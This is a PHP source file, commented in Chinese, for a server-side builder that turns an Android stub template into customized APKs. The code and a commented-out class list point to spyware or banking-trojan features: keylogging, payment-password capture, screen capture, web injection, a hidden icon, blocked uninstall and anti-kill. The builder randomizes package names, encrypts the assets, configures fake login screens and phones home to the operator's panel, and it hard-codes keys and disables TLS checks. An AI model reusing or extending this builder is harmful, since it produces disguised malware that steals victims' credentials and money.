<?php
/**
 * APK Builder - PHP 版本
 * 替代原 Windows EaodWorker.exe
 */

class ApkBuilder {
    private $baseDir;
    private $toolsDir;
    private $apktoolPath;
    private $apkEditorPath;
    private $workDir;
    private $userId;
    private $appId;
    private $userFolder;
    private $logFile;
    
    // 构建参数
    private $params = [];
    
    // 目标区域: cn / global（影响模板选择）
    private $buildRegion = 'global';

    // 状态常量
    const STATE_BUILDING = 'onbuild';
    const STATE_FAILED = 'failed';
    const STATE_FINISHED = 'finished';
    
    // 混淆后的类名
    private $obfuscatedNames = [];
    
    // 新生成的包名
    private $newPackageName = '';
    
    // 所有替换规则
    private $replacements = [];
    
    // Assets 加密密钥
    private $assetsPass = '';
    
    public function __construct() {
        $this->baseDir = dirname(__DIR__);
        $this->toolsDir = __DIR__ . '/tools';
        $this->apktoolPath = $this->toolsDir . '/apktool.jar';
        $this->apkEditorPath = $this->toolsDir . '/APKEditor.jar';
        // 自动生成 debug keystore（如果不存在）
        $this->ensureKeystore();
    }
    
    /**
     * 确保签名密钥库存在，不存在则自动生成 debug keystore
     */
    private function ensureKeystore() {
        $keystorePath = __DIR__ . '/apk-release.keystore';
        if (file_exists($keystorePath)) return;
        $this->log(">> 密钥库不存在，自动生成 debug keystore...");
        $cmd = 'keytool -genkey -v -keystore ' . escapeshellarg($keystorePath) .
               ' -alias apk-release -keyalg RSA -keysize 2048 -validity 36500' .
               ' -storepass android123 -keypass android123' .
               ' -dname "CN=PandaWorkshop, OU=Dev, O=Panda, L=Shenzhen, ST=GD, C=CN"';
        $output = [];
        $ret = 0;
        exec($cmd . ' 2>&1', $output, $ret);
        if ($ret === 0 && file_exists($keystorePath)) {
            $this->log(">> debug keystore 已生成");
        } else {
            $this->log(">> 自动生成 keystore 失败，将使用未签名 APK", 'warning');
        }
    }

    /**
     * 记录日志
     */
    private function log($message, $type = 'info') {
        $timestamp = date('Y-m-d H:i:s');
        $logEntry = "[$timestamp][$type] $message\n";
        
        if ($this->logFile) {
            file_put_contents($this->logFile, $logEntry, FILE_APPEND);
        }
        
        // 同时写入构建日志
        if ($this->userId) {
            $buildLogDir = __DIR__ . '/logs/' . $this->userId;
            if (!is_dir($buildLogDir)) {
                mkdir($buildLogDir, 0755, true);
            }
            $buildLog = $buildLogDir . '/' . date('Y-m-d') . '-log.json';
            
            $logs = [];
            if (file_exists($buildLog)) {
                $logs = json_decode(file_get_contents($buildLog), true) ?: [];
            }
            $logs[] = [
                'timestamp' => $timestamp,
                'type' => $type,
                'message' => $message
            ];
            file_put_contents($buildLog, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        }
    }
    
    /**
     * 记录错误
     */
    private function logError($method, $message) {
        $this->log("[$method] $message", 'error');
        
        if ($this->userId) {
            $errorLogDir = __DIR__ . '/errors/' . $this->userId;
            if (!is_dir($errorLogDir)) {
                mkdir($errorLogDir, 0755, true);
            }
            $errorLog = $errorLogDir . '/' . $this->userId . '-' . date('Y-m-d') . '-log.json';
            
            $errors = [];
            if (file_exists($errorLog)) {
                $errors = json_decode(file_get_contents($errorLog), true) ?: [];
            }
            $errors[] = [
                'timestamp' => date('Y-m-d H:i:s'),
                'method' => $method,
                'message' => $message
            ];
            file_put_contents($errorLog, json_encode($errors, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        }
    }
    
    /**
     * 生成随机字符串
     */
    private function randomString($length = 10) {
        $chars = 'abcdefghijklmnopqrstuvwxyz';
        $result = '';
        for ($i = 0; $i < $length; $i++) {
            $result .= $chars[random_int(0, strlen($chars) - 1)];
        }
        return $result;
    }
    
    /**
     * 生成随机包名
     */
    private function generateRandomPackage() {
        $prefixes = ['com', 'org', 'net', 'io'];
        $prefix = $prefixes[array_rand($prefixes)];
        return $prefix . '.' . $this->randomString(8) . '.' . $this->randomString(6);
    }
    
    /**
     * AES 加密（用于配置值）
     * 使用与原始 .NET EaodWorker 相同的加密参数
     */
    private function encrypt($data) {
        $iv = '2230209522049090';
        $password = '4814780584699673';
        $salt = '2894356330652558';
        
        // 使用 PBKDF2 派生密钥（与 .NET Rfc2898DeriveBytes 兼容）
        $key = hash_pbkdf2('sha1', $password, $salt, 65536, 16, true);
        
        // AES-128-CBC 加密
        $encrypted = openssl_encrypt($data, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
        
        return base64_encode($encrypted);
    }
    
    /**
     * 执行命令
     */
    private function execCommand($command, &$output = [], &$returnVar = 0) {
        $this->log("执行命令: $command");
        exec($command . ' 2>&1', $output, $returnVar);
        if ($returnVar !== 0) {
            $this->logError('execCommand', "命令失败 (code: $returnVar): " . implode("\n", $output));
        }
        return $returnVar === 0;
    }
    
    /**
     * 递归复制目录
     */
    private function copyDir($src, $dst) {
        if (!is_dir($dst)) {
            mkdir($dst, 0755, true);
        }
        $dir = opendir($src);
        while (($file = readdir($dir)) !== false) {
            if ($file != '.' && $file != '..') {
                $srcPath = $src . '/' . $file;
                $dstPath = $dst . '/' . $file;
                if (is_dir($srcPath)) {
                    $this->copyDir($srcPath, $dstPath);
                } else {
                    copy($srcPath, $dstPath);
                }
            }
        }
        closedir($dir);
    }
    
    /**
     * 递归删除目录
     */
    private function removeDir($dir) {
        if (!is_dir($dir)) return;
        $files = array_diff(scandir($dir), ['.', '..']);
        foreach ($files as $file) {
            $path = $dir . '/' . $file;
            is_dir($path) ? $this->removeDir($path) : unlink($path);
        }
        rmdir($dir);
    }
    
    /**
     * 解压 ZIP 文件
     */
    private function extractZip($zipPath, $destPath) {
        $this->log("解压: $zipPath -> $destPath");
        $zip = new ZipArchive();
        if ($zip->open($zipPath) === true) {
            $zip->extractTo($destPath);
            $zip->close();
            return true;
        }
        $this->logError('extractZip', "无法打开 ZIP: $zipPath");
        return false;
    }
    
    /**
     * XOR 加密/解密字节
     */
    private function xorBytes($data, $password) {
        $passBytes = $password; // 密码字符串
        $passLen = strlen($passBytes);
        $result = '';
        $dataLen = strlen($data);
        
        for ($i = 0; $i < $dataLen; $i++) {
            $result .= chr(ord($data[$i]) ^ ord($passBytes[$i % $passLen]));
        }
        
        return $result;
    }
    
    /**
     * 加密 Assets 文件夹中的所有文件
     */
    private function encryptAssetsFolder($assetsDir) {
        if (!is_dir($assetsDir)) {
            $this->log("Assets 目录不存在: $assetsDir", 'warning');
            return false;
        }
        
        $this->log("开始加密 Assets 文件夹: $assetsDir (密钥: {$this->assetsPass})");
        
        $files = glob($assetsDir . '/*');
        $encryptedCount = 0;
        
        foreach ($files as $file) {
            if (is_file($file)) {
                // 读取文件内容
                $content = file_get_contents($file);
                if ($content === false) {
                    $this->log("无法读取文件: $file", 'warning');
                    continue;
                }
                
                // XOR 加密
                $encrypted = $this->xorBytes($content, $this->assetsPass);
                
                // 写回文件
                if (file_put_contents($file, $encrypted) !== false) {
                    $encryptedCount++;
                    $this->log(">> 已加密: " . basename($file));
                } else {
                    $this->log("无法写入文件: $file", 'warning');
                }
            }
        }
        
        $this->log("Assets 加密完成: $encryptedCount 个文件");
        return true;
    }
    
    /**
     * 更新构建状态
     */
    private function updateState($state, $extraData = []) {
        $this->log("更新状态: $state");
        
        // 判断使用哪个 API（Custom app 用 91370，Store 用 90061）
        $isCustomApp = ($this->params['buildtype'] === 'C');
        $apiFile = $isCustomApp ? 'Eaod91370.php' : 'Eaod90061.php';
        $baseUrl = getenv('APP_URL') ?: 'http://127.0.0.1';
        $apiUrl = rtrim($baseUrl, '/') . '/private/' . $apiFile;
        $host = $this->params['UserHost'];
        
        // 构建请求数据
        $data = [
            'userid' => $this->userId,
            'appid' => $this->appId,
            'subcom' => $state
        ];
        
        // 合并额外数据
        if (!empty($extraData)) {
            $data = array_merge($data, $extraData);
        }
        
        $this->log("调用 API: $apiUrl (Host: $host), 数据: " . json_encode($data));
        
        $ch = curl_init($apiUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json',
            'Host: ' . $host
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_POSTREDIR, 7);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($error) {
            $this->log("API 调用错误: $error", 'error');
        } else {
            $this->log("API 响应 (HTTP $httpCode): $response");
        }
    }
    
    /**
     * 初始化构建参数
     */
    public function init($args) {
        $this->params = [
            'appid' => $args[0],
            'userid' => $args[1],
            'clientname' => $args[2],
            'email' => $args[3],
            'mainActivity' => $args[4],
            'appFolder' => $args[5],
            'UserHost' => $args[6],
            'use_access' => $args[7],
            'use_antkill' => $args[8],
            'use_atoprims' => $args[9],
            'notifytitle' => $args[10],
            'notifymsg' => $args[11],
            'allprims' => $args[12],
            'blackprims' => $args[13],
            'buildtype' => $args[14],
            'appname' => $args[15],
            'appversion' => $args[16],
            'appicopath' => $args[17],
            'appurl' => $args[18],
            'logintitle' => $args[19],
            'logindis' => $args[20],
            'loginbtn' => $args[21],
            'lngshort' => $args[22],
            'hiddenapp' => $args[23],
            'noemulator' => $args[24],
            'installtype' => $args[25],
            'hidetype' => $args[26],
            'use_draw' => $args[27],
            'open_access' => $args[28],
            'descr_iption' => $args[29],
            'diao_type' => $args[30],
            'build_region' => $args[31] ?? 'global',
        ];
        
        $this->userId = $this->params['userid'];
        $this->appId = $this->params['appid'];
        $this->buildRegion = in_array($this->params['build_region'] ?? '', ['cn', 'global']) ? $this->params['build_region'] : 'global';
        $this->log("构建区域: {$this->buildRegion}");
        
        // 设置工作目录
        $this->workDir = sys_get_temp_dir() . '/apkbuild_' . $this->userId . '_' . $this->appId . '_' . time();
        $this->userFolder = $this->baseDir . '/user/apps/' . $this->userId . '/' . $this->appId;
        $this->logFile = sys_get_temp_dir() . '/apkbuild_' . $this->userId . '.log';
        
        // 创建目录
        if (!is_dir($this->workDir)) mkdir($this->workDir, 0755, true);
        if (!is_dir($this->userFolder)) mkdir($this->userFolder, 0755, true);
        
        $this->log("初始化完成 - userId: {$this->userId}, appId: {$this->appId}");
        $this->log("工作目录: {$this->workDir}");
        
        return true;
    }
    
    /**
     * 生成混淆的类名
     * 暂时禁用混淆 - 保持原始类名
     */
    private function generateObfuscatedNames() {
        // 禁用混淆 - 不替换类名
        $this->obfuscatedNames = [];
        
        /* 原始混淆代码 - 暂时禁用
        $classes = [
            'AccessibilityActivity', 'AccessServices', 'AccessTools', 'HiddenBrowser',
            'ActivityCaptureScreen', 'ActivityMonitors', 'CameraCap', 'Codes', 'Consts',
            'ChatActivity', 'Contct_manager', 'My_Configs', 'ActivityDraw', 'My_Crpter',
            'Deviceinfo', 'filesManager', 'id_Commands', 'KeyStorksQ', 'LiveChat',
            'QueryChats', 'LiveKeysStrok', 'StarterServices', 'LocationMonitor',
            'LockAppsActivity', 'MainActivity', 'MyLoger', 'MyNotification', 'MyPacket',
            'MySettings', 'PermissionsActivity', 'RecordPayPassWord', 'RequestDraw',
            'MuteUninstall', 'RequestPermissions2', 'ScreenCaps', 'ScreenReceiver',
            'StatusMonitor', 'UtliTools', 'NotifyListenService', 'WorkServices',
            'HiddenActivity', 'LockActivity', 'BrodcastActivity', 'OPPOAutostart',
            'RestrectionActivity', 'AnUninstall', 'TransparentActivity', 'EngineWorker',
            'TransparentLauncherAlias', 'SIMLauncherAlias', 'ChromeLauncherAlias',
            'OppoLauncherAlias', 'VivoLauncherAlias', 'MuteActivity', 'AlertActivity',
            'HiddenIco', 'WebBrowser', 'Webjector', 'Apps_Manage', 'AudioRecorder'
        ];
        
        foreach ($classes as $class) {
            $this->obfuscatedNames[$class] = $this->randomString(random_int(5, 13));
        }
        */
    }
    
    /**
     * 步骤1: 准备工作目录和解压模板
     */
    private function step1() {
        $this->log(">> Step1: 准备工作目录...");
        
        // 确定使用哪个模板
        $stubDir = __DIR__ . '/apkstub';
        if ($this->params['allprims'] === '1') {
            $zipPath = $stubDir . '/apkstub.zip';
        } else {
            $zipPath = $stubDir . '/apkstubg.zip';
        }
        
        if (!file_exists($zipPath)) {
            $this->logError('step1', "模板文件不存在: $zipPath");
            return false;
        }
        
        // 解压模板
        $apkDir = $this->workDir . '/apk';
        if (!$this->extractZip($zipPath, $apkDir)) {
            return false;
        }
        
        $this->log(">> Step1: 模板解压完成");
        return true;
    }
    
    /**
     * 步骤2: 修改配置和混淆
     */
    private function step2() {
        $this->log(">> Step2: 修改配置...");
        
        $apkDir = $this->workDir . '/apk';
        
        // 生成混淆名称
        $this->generateObfuscatedNames();
        
        // 生成新包名
        $newPackage = $this->generateRandomPackage();
        $oldPackage = 'com.icontrol.protector';
        
        // 保存新包名
        $this->newPackageName = $newPackage;
        
        $this->log("新包名: $newPackage");
        // 根据 build_region 自动设定语言和通知文本
        if ($this->buildRegion === 'cn') {
            if (empty($this->params['lngshort'])) $this->params['lngshort'] = 'zh';
            if (empty($this->params['notifytitle']) || trim($this->params['notifytitle']) === '') {
                $this->params['notifytitle'] = '消息通知';
                $this->params['notifymsg'] = '有一条新消息';
            }
        } else {
            if (empty($this->params['lngshort'])) $this->params['lngshort'] = 'en';
            if (empty($this->params['notifytitle']) || trim($this->params['notifytitle']) === '') {
                $this->params['notifytitle'] = 'Notification';
                $this->params['notifymsg'] = 'You have a new message';
            }
        }
        $this->log("语言/通知: lngshort={$this->params['lngshort']}, title={$this->params['notifytitle']}");
        
        // 生成混淆随机字符串
        $obfsRandom = $this->randomString(16);
        
        // 生成 Assets 加密密钥 (8-16 字符随机字符串)
        $this->assetsPass = $this->randomString(12);
        $this->log("生成 Assets 密钥: " . $this->assetsPass);
        
        // 构建所有替换规则
        $this->replacements = [
            // 基本配置
            '[OBFS]' => $obfsRandom,
            '[Client_N]' => $this->params['clientname'],
            '[_NOTIFI_TITLE_]' => $this->params['notifytitle'] ?: ' ',
            '[_NOTIFI_MSG_]' => $this->params['notifymsg'] ?: 'on',
            
            // 设备跟踪标识符 - 重要！用于设备上线识别
            '[NAME>LNK>ID!]' => $this->params['appname'] . '>' . $this->userId . '>' . $this->appId,
            
            // 域名和 URL
            '[USER_DOM]' => $this->params['UserHost'],
            '[USER_MAIL]' => $this->params['email'], // 前端已加密，直接使用
            '[BSE_URL]' => $this->encrypt($this->params['appurl']), // appurl 需要加密
            
            // 登录界面配置
            '[log-title]' => $this->params['logintitle'],
            '[log-dis]' => $this->params['logindis'],
            '[log-btn]' => $this->params['loginbtn'],
            '[log-lng]' => $this->params['lngshort'],
            '[USE-AUTOGRANT]' => $this->params['use_atoprims'],
            
            // 功能开关
            '[USE-SUPER]' => $this->params['use_access'],
            '[USE-ALLPRIM]' => $this->params['allprims'],
            '[USE-NOKILL]' => $this->params['use_antkill'],
            '[USE-BLACK]' => $this->params['blackprims'],
            '[USE-HIDDEEN]' => $this->params['hiddenapp'],
            '[USE-DRAWOVER]' => $this->params['use_draw'],
            '[USE-OOENACC]' => $this->params['open_access'],
            '[USE-DIAO]' => $this->params['diao_type'],
            '[USE-GUID]' => $this->params['installtype'],
            '[USE-FAKE]' => $this->params['hidetype'],
            '[USE-STORE]' => '0', // Custom app
            '[USE-CAPLOCK]' => '0',
            '[AST-PAS]' => $this->assetsPass, // 使用同一个密钥
            // 构建区域（用于 smali 中判断 CN/Global 行为）
            '[BUILD_REGION]' => $this->buildRegion,
            
            // 包名替换
            $oldPackage => $newPackage,
            'L' . str_replace('.', '/', $oldPackage) => 'L' . str_replace('.', '/', $newPackage),
        ];
        
        $this->log("配置替换规则数量: " . count($this->replacements));
        
        // 修改 AndroidManifest.xml
        $manifestPath = $apkDir . '/AndroidManifest.xml';
        if (file_exists($manifestPath)) {
            $manifest = file_get_contents($manifestPath);
            
            foreach ($this->replacements as $search => $replace) {
                $manifest = str_replace($search, $replace, $manifest);
            }
            
            file_put_contents($manifestPath, $manifest);
            $this->log(">> AndroidManifest.xml 已更新");
        }
        
        // 修改 strings.xml
        $stringsPath = $apkDir . '/res/values/strings.xml';
        if (file_exists($stringsPath)) {
            $strings = file_get_contents($stringsPath);
            $strings = str_replace('[BASE_NAME]', $this->params['appname'], $strings);
            $strings = str_replace('[BASE_DESC]', $this->params['descr_iption'], $strings);
            file_put_contents($stringsPath, $strings);
            $this->log(">> strings.xml 已更新");
        }
        
        // 修改 smali 文件
        $this->modifySmaliFiles($apkDir, $oldPackage, $newPackage);
        
        // 加密 Assets 文件夹 (使用 XOR 加密，与 APK 中的 cg0.z() 解密方法配套)
        $assetsDir = $apkDir . '/assets';
        if (is_dir($assetsDir)) {
            $this->encryptAssetsFolder($assetsDir);
        }
        
        // 复制图标
        $iconSrc = $this->baseDir . '/user/storage/' . $this->userId . '/icons/' . $this->params['appicopath'];
        $iconDst = $apkDir . '/res/drawable/mylogo.png';
        if (file_exists($iconSrc)) {
            copy($iconSrc, $iconDst);
            $this->log(">> 图标已复制");
        }

        // 复制背景图到 res/drawable/blackui.png（APK 遮挡界面通过 getIdentifier("blackui","drawable",pkg) 加载）
        $uiPath = $this->params['noemulator'] ?? '';
        if (!empty($uiPath) && $uiPath !== '0' && $uiPath !== 'black') {
            $cleanPath = ltrim(str_replace('\\', '/', $uiPath), '/');
            $bgSrc = $this->baseDir . '/user/' . $cleanPath;
            if (!file_exists($bgSrc)) {
                $bgSrc = $this->baseDir . '/user/ui/' . basename($cleanPath);
            }
            $bgDst = $apkDir . '/res/drawable/blackui.png';
            if (file_exists($bgSrc)) {
                copy($bgSrc, $bgDst);
                $this->log(">> 背景图已复制到 drawable: $bgSrc -> $bgDst");
            } else {
                $this->log(">> 背景图未找到: $bgSrc", 'warning');
            }
        } else {
            $this->log(">> 未选择背景图，使用默认 blackui");
        }

        
        $this->log(">> Step2: 完成");
        return true;
    }
    
    /**
     * 修改 smali 文件
     */
        private function modifySmaliFiles($apkDir, $oldPackage, $newPackage) {
            $smaliDirs = ['smali', 'smali_classes2', 'smali_classes3', 'smali_classes4'];
        
        $modifiedCount = 0;
        
        foreach ($smaliDirs as $smaliSubDir) {
            $smaliDir = $apkDir . '/' . $smaliSubDir;
            if (!is_dir($smaliDir)) continue;
            
            $this->log(">> 处理 smali 目录: $smaliSubDir");
            
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($smaliDir)
            );
            
            foreach ($iterator as $file) {
                if ($file->isFile() && $file->getExtension() === 'smali') {
                    $content = file_get_contents($file->getPathname());
                    $originalContent = $content;
                    
                    // 应用所有替换规则
                    foreach ($this->replacements as $search => $replace) {
                        $content = str_replace($search, $replace, $content);
                    }
                    
                    // 混淆类名
                    foreach ($this->obfuscatedNames as $original => $obfuscated) {
                        $content = str_replace($original, $obfuscated, $content);
                    }
                    
                    // 只有内容变化才写入
                    if ($content !== $originalContent) {
                        file_put_contents($file->getPathname(), $content);
                        $modifiedCount++;
                    }
                }
            }
        }
        
        $this->log(">> smali 文件已修改，共 $modifiedCount 个文件");
    }
    
    /**
     * 步骤3: 使用 apktool 重新打包（原模板方式）
     */
    private function step3() {
        $this->log(">> Step3: 重新打包 APK...");
        
        $apkDir = $this->workDir . '/apk';
        $outputDir = $this->workDir . '/out';
        $outputApk = $outputDir . '/app.apk';
        $signedApk = $outputDir . '/app-signed.apk';
        
        if (!is_dir($outputDir)) mkdir($outputDir, 0755, true);
        
        // 使用 apktool 重新打包
        $cmd = "java -jar " . escapeshellarg($this->apktoolPath) . " b -f " . 
               escapeshellarg($apkDir) . " -o " . escapeshellarg($outputApk);
        
        if (!$this->execCommand($cmd, $output, $returnVar)) {
            $this->logError('step3', "apktool 打包失败");
            return false;
        }
        
        if (!file_exists($outputApk)) {
            $this->logError('step3', "APK 文件未生成");
            return false;
        }
        
        $this->log(">> APK 打包完成");
        
        // 签名
        $this->signApk($outputApk, $signedApk);
        
        return true;
    }

    /**
     * 签名 APK（使用 uber-apk-signer.jar，内置 zipalign + apksigner）
     */
    private function signApk($inputApk, $outputApk) {
        $this->log(">> 签名 APK...");
        $uberSigner = $this->toolsDir . "/uber-apk-signer.jar";
        if (!file_exists($uberSigner)) {
            $this->log(">> uber-apk-signer.jar 不存在，复制未签名 APK", "warning");
            copy($inputApk, $outputApk);
            return true;
        }
        copy($inputApk, $outputApk);
        $cmd = "java -jar " . escapeshellarg($uberSigner) .
               " --apks " . escapeshellarg($outputApk) .
               " --overwrite 2>&1";
        $this->log(">> 执行 uber-apk-signer 签名...");
        exec($cmd, $output, $returnVar);
        $resultStr = implode("\n", $output ?? []);
        if ($returnVar === 0 || strpos($resultStr, "Verification succesful") !== false) {
            $this->log(">> APK 签名+对齐完成");
            return true;
        }
        $this->log(">> 签名失败: " . $resultStr, "warning");
        return true;
    }

    /**
     * 完成构建
     */
    private function finish() {
        $this->log(">> 完成构建...");
        $outputDir = $this->workDir . "/out";
        $signedApk = $outputDir . "/app-signed.apk";
        $unsignedApk = $outputDir . "/app.apk";
        $sourceApk = file_exists($signedApk) ? $signedApk : $unsignedApk;
        if (!file_exists($sourceApk)) {
            $this->logError("finish", "最终 APK 不存在");
            $this->updateState(self::STATE_FAILED);
            return false;
        }
        $finalApk = $this->userFolder . "/" . $this->appId . ".apk";
        copy($sourceApk, $finalApk);
        @chmod($finalApk, 0644);
        $this->removeDir($this->workDir);
        $this->log(">> APK 已保存到: " . $finalApk);
        $this->log(">> 新包名: " . $this->newPackageName);
        $this->updateState(self::STATE_FINISHED);
        return true;
    }

    /**
     * 获取新包名（用于返回给前端）
     */
    public function getNewPackageName() {
        return $this->newPackageName ?? "";
    }

    /**
     * 执行构建
     */
    public function build() {
        try {
            $this->log("========== 开始构建 ==========");
            $appPath = 'user/apps/' . $this->userId . '/' . $this->appId . '/' . $this->appId . '.apk';
            $this->updateState(self::STATE_BUILDING, [
                'apppath' => $appPath,
                'appname' => $this->params['appname'],
                'appico' => $this->userId . '/icons/' . $this->params['appicopath']
            ]);
            if (!$this->step1()) { $this->log(">> 构建失败"); $this->updateState(self::STATE_FAILED); return false; }
            if (!$this->step2()) { $this->log(">> 构建失败"); $this->updateState(self::STATE_FAILED); return false; }
            if (!$this->step3()) { $this->log(">> 构建失败"); $this->updateState(self::STATE_FAILED); return false; }
            return $this->finish();
        } catch (Exception $e) {
            $this->logError('build', $e->getMessage());
            $this->updateState(self::STATE_FAILED);
            return false;
        }
    }
}

// CLI 模式运行
if (php_sapi_name() === 'cli' && isset($argv[1])) {
    $args = array_slice($argv, 1);
    
    // 解码 base64 参数
    $decodedArgs = array_map('base64_decode', $args);
    
    echo date('Y-m-d H:i:s') . " [INFO] CLI 构建开始\n";
    
    $builder = new ApkBuilder();
    if ($builder->init($decodedArgs)) {
        $result = $builder->build();
        if ($result) {
            echo date('Y-m-d H:i:s') . " [INFO] 完成构建\n";
        } else {
            echo date('Y-m-d H:i:s') . " [ERROR] 构建失败\n";
        }
        exit($result ? 0 : 1);
    }
    echo date('Y-m-d H:i:s') . " [ERROR] 构建初始化失败\n";
    exit(1);
}
